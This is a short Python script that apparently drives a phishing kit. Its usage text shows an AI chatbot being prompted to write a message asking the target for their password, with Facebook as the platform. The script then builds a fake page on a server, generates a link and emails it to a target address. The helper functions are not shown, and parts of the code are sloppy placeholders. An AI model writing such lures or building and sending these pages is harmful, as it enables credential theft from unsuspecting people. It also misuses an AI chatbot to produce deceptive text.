import funcoes,sys


if sys.argv[1] == '-h' or sys.argv[1] == False:
    print('''
    
     usage:
       python3 pinai.py 'comand that you want for chatgpt' 'plataform' 'to_address_email'
    
     example:
         python3 pinai.py 'write a text to my chef asking my password' 'facebook' 'example@gmail.com'
    
    ''')
    sys.exit()

else:
    ai = str(sys.argv[1])
    #resposta do texto solicitado pelo chatgpt
    rai = funcoes.ia(ai)
    link = str(sys.argv[2])
    #Criando a pagina e movendo para a pasta do servidor e gerando um link de acesso
    funcoes.link(link)
contnue = input('Did you wish continue? y/n: ')
if contnue == 'y':
    pass
elif contnue == 'n':
    sys.exit()
else:
    contnue = input('Did you wish continue? y/n: ')

a = 'asdasd'
From = str(sys.argv[3])
funcoes.enviar_email(From,a,a)
